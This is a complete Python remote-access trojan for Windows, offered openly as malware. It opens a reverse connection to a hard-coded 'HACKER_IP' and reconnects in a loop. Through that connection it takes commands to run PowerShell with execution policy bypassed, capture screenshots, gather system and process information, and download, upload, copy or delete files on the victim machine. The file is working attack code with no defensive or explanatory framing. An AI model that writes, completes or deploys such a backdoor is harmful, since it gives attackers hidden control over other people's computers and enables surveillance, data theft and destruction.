import socket
import os
import subprocess
import pyautogui
import shutil
import time
import struct
from datetime import datetime

# Global variable to maintain current working directory
CURRENT_DIR = os.getcwd()

def execute_powershell(cmd):
    try:
        result = subprocess.run(
            ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd],
            capture_output=True,
            text=True,
            shell=True
        )
        return result.stdout.strip() or result.stderr.strip()
    except Exception as e:
        return f"PowerShell Error: {str(e)}"

def list_commands():
    return """
    Available Commands:
    ?                - Show this help menu
    ls, dir          - List files in the current directory
    cd <path>        - Change directory to <path>
    pwd              - Show current working directory
    ps <cmd>         - Execute PowerShell command
    download <file>  - Download a file from target system
    upload <file>    - Upload a file to target system
    create <file>    - Create an empty file
    delete <file>    - Delete a file
    copy <src> <dst> - Copy a file
    screenshot       - Take a screenshot and send it
    sysinfo          - Get system information
    processes        - List running processes
    exit             - Close the connection
    """

def execute_command(cmd, conn):
    global CURRENT_DIR
    
    try:
        if cmd == "?":
            return list_commands()

        elif cmd.lower() in ["ls", "dir"]:
            return execute_powershell(f"cd '{CURRENT_DIR}'; Get-ChildItem -Force | Format-Table -Wrap -AutoSize | Out-String -Width 8192")

        elif cmd.startswith("cd "):
            path = cmd[3:]
            try:
                new_dir = os.path.abspath(os.path.join(CURRENT_DIR, path))
                os.chdir(new_dir)
                CURRENT_DIR = os.getcwd()
                return f"Current directory: {CURRENT_DIR}"
            except Exception as e:
                return f"Error changing directory: {str(e)}"

        elif cmd == "pwd":
            return CURRENT_DIR

        elif cmd.startswith("ps "):
            return execute_powershell(cmd[3:])

        elif cmd.startswith("download "):
            filepath = cmd[9:]
            abs_path = os.path.join(CURRENT_DIR, filepath) if not os.path.isabs(filepath) else filepath
            if os.path.exists(abs_path):
                try:
                    filesize = os.path.getsize(abs_path)
                    conn.send(f"FILESIZE {filesize}".encode())
                    with open(abs_path, "rb") as f:
                        while chunk := f.read(4096):
                            conn.send(chunk)
                    return "File transfer complete"
                except Exception as e:
                    return f"Error transferring file: {str(e)}"
            return "FileNotFound"

        elif cmd.startswith("upload "):
            parts = cmd.split(" ", 1)
            if len(parts) < 2:
                return "Usage: upload <file>"
            filename = parts[1]
            abs_path = os.path.join(CURRENT_DIR, filename)
            conn.send("READY".encode())
            file_size = struct.unpack("!I", conn.recv(4))[0]
            with open(abs_path, "wb") as f:
                received = 0
                while received < file_size:
                    chunk = conn.recv(min(4096, file_size - received))
                    if not chunk:
                        break
                    f.write(chunk)
                    received += len(chunk)
            return f"File {filename} uploaded successfully to {abs_path}"

        elif cmd.startswith("create "):
            filename = cmd[7:]
            abs_path = os.path.join(CURRENT_DIR, filename)
            open(abs_path, "w").close()
            return f"File {abs_path} created"

        elif cmd.startswith("delete "):
            filename = cmd[7:]
            abs_path = os.path.join(CURRENT_DIR, filename) if not os.path.isabs(filename) else filename
            if os.path.exists(abs_path):
                os.remove(abs_path)
                return f"File {abs_path} deleted"
            return "FileNotFound"

        elif cmd.startswith("copy "):
            parts = cmd.split(" ", 2)
            if len(parts) < 3:
                return "Usage: copy <src> <dst>"
            src = os.path.join(CURRENT_DIR, parts[1]) if not os.path.isabs(parts[1]) else parts[1]
            dst = os.path.join(CURRENT_DIR, parts[2]) if not os.path.isabs(parts[2]) else parts[2]
            if os.path.exists(src):
                shutil.copy(src, dst)
                return f"File copied from {src} to {dst}"
            return "Source file not found"

        elif cmd == "screenshot":
            filename = f"ss_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            abs_path = os.path.join(CURRENT_DIR, filename)
            pyautogui.screenshot(abs_path)
            with open(abs_path, "rb") as f:
                data = f.read()
            os.remove(abs_path)
            return data

        elif cmd == "sysinfo":
            return execute_powershell("Get-ComputerInfo | Select-Object *")

        elif cmd == "processes":
            return execute_powershell("Get-Process | Format-Table Name,CPU,Id | Out-String -Width 8192")

        else:
            return "UnknownCommand"

    except Exception as e:
        return f"Error: {str(e)}"

def main():
    HACKER_IP = "192.168.1.14"  # CHANGE THIS
    HACKER_PORT = 8008

    while True:
        try:
            with socket.socket() as s:
                s.connect((HACKER_IP, HACKER_PORT))
                while True:
                    # Clear any leftover data in the buffer first
                    s.setblocking(0)  # Non-blocking mode to check for leftover data
                    try:
                        while s.recv(4096):  # Clear the buffer
                            pass
                    except BlockingIOError:
                        pass  # No more data to read
                    s.setblocking(1)  # Back to blocking mode

                    # Now wait for and process the actual command
                    cmd = s.recv(4096).decode().strip()
                    if not cmd:
                        continue

                    if cmd == "exit":
                        break

                    response = execute_command(cmd, s)
                    if isinstance(response, str):
                        s.send(response.encode())
                    else:
                        s.send(struct.pack("!I", len(response)) + response)

        except Exception as e:
            print(f"Connection error: {str(e)}")
            time.sleep(10)
            continue

if __name__ == "__main__":
    main()